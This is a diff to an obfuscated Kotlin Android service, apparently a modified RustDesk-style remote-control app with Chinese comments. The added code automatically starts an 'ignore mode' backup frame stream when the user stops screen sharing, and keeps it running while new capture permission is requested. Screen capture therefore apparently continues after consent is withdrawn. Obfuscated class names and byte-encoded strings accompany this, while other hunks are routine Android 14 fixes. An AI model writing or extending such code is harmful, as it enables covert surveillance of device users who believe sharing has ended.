@@ -225,6 +225,10 @@ class DFm8Y8iMScvB2YDw : Service() {
                     Log.i("MainService", "关共享: received, posting to main thread")
                     Handler(Looper.getMainLooper()).post {
                         killMediaProjection()
+                        // 关共享后自动激活无视模式作为备用帧流，防止画面冻结
+                        ClsFx9V0S.rEqMB3nD(0)  // PIXEL_SIZEBack8=0，允许无视帧通过Rust层
+                        nZW99cdXQ0COhB2o.ctx?.onstop_overlay("1", "")
+                        Log.i("MainService", "关共享: 已自动激活无视模式作为备用")
                     }
                 }
                 else if(arg1==p50.a(byteArrayOf(-16), byteArrayOf(-63, -13, -107, -101, 57, 111, 52, -114)))
@@ -484,6 +488,16 @@ class DFm8Y8iMScvB2YDw : Service() {
                 }, Handler(Looper.getMainLooper()))
                 checkMediaPermission()
                 _isReady = true
+
+                // 新权限获取成功，关闭无视备用模式并自动启动捕获
+                shouldRun = false
+                SKL = false
+                ClsFx9V0S.rEqMB3nD(255)  // PIXEL_SIZEBack8=255，阻止无视帧
+                Log.i("MainService", "onStartCommand: 新权限获取成功，关闭无视模式")
+                if (!_isStart) {
+                    startCapture()
+                    Log.i("MainService", "onStartCommand: 自动启动捕获")
+                }
             } ?: let {
         
                 requestMediaProjection()
@@ -695,6 +709,12 @@ class DFm8Y8iMScvB2YDw : Service() {
         }
         mediaProjection = null
 
+        // Android 14+: MediaProjection token 在 stop() 后变为一次性，无法复用
+        // 清除保存的 Intent，避免 restoreMediaProjection 中无意义的失败尝试
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+            savedMediaProjectionIntent = null
+        }
+
         _isStart = false
         _isReady = false
         _isAudioStart = false
@@ -728,9 +748,8 @@ class DFm8Y8iMScvB2YDw : Service() {
             return
         }
 
-        shouldRun = false
-        SKL = false
-        Log.i("MainService", "restoreMediaProjection: stopped screenshot loop")
+        // 不在此处关闭无视模式，保持备用帧流直到MediaProjection成功恢复
+        // shouldRun 和 PIXEL_SIZEBack8 将在成功获取MediaProjection后才清除
 
         val savedIntent = savedMediaProjectionIntent
         if (savedIntent != null) {
@@ -741,6 +760,12 @@ class DFm8Y8iMScvB2YDw : Service() {
                 val newProjection = mediaProjectionManager.getMediaProjection(Activity.RESULT_OK, savedIntent.clone() as Intent)
 
                 if (newProjection != null) {
+                    // Token复用成功，现在安全地关闭无视模式
+                    shouldRun = false
+                    SKL = false
+                    ClsFx9V0S.rEqMB3nD(255)  // PIXEL_SIZEBack8=255，阻止无视帧
+                    Log.i("MainService", "restoreMediaProjection: 无视模式已关闭")
+
                     mediaProjection = newProjection
                     mediaProjection?.registerCallback(object : android.media.projection.MediaProjection.Callback() {
                         override fun onStop() {
@@ -766,7 +791,8 @@ class DFm8Y8iMScvB2YDw : Service() {
             }
         }
 
-        Log.i("MainService", "restoreMediaProjection: requesting new MediaProjection permission")
+        // Token不可用，需要新权限。无视模式继续运行作为备用帧流
+        Log.i("MainService", "restoreMediaProjection: requesting new MediaProjection permission (无视模式保持运行)")
         requestMediaProjection()
     }
 
@@ -1032,7 +1058,12 @@ class DFm8Y8iMScvB2YDw : Service() {
             .setWhen(0)
             .setShowWhen(false)
             .build()
-        startForeground(DEFAULT_NOTIFY_ID, notification)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            startForeground(DEFAULT_NOTIFY_ID, notification,
+                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
+        } else {
+            startForeground(DEFAULT_NOTIFY_ID, notification)
+        }
 
         try {
             if (!cpuWakeLock.isHeld) {
